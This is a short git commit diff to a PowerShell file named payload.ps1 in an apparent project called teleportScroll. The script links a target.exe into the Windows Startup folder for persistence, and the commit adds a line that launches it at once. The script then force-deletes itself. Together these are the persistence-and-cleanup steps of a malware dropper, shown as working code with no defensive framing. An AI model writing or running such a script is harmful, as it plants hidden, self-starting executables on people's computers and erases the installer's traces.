a50373d8e4b85d9d5ae8f358154f6d31970ee5ad
kenawhy <108243883+kenawhy@users.noreply.github.com>
2025-05-13 21:08:28 +0900

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -3,4 +3,5 @@
 $source = "C:\Users\Public\teleportScroll\teleportScroll-main\dist\target.exe"
 $shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\target.exe"
 cmd /c mklink `"$shortcut`" `"$source`"
+Start-Process -FilePath $source
 Remove-Item 'C:\Users\Public\teleportScroll\teleportScroll-main\payload.ps1' -Force
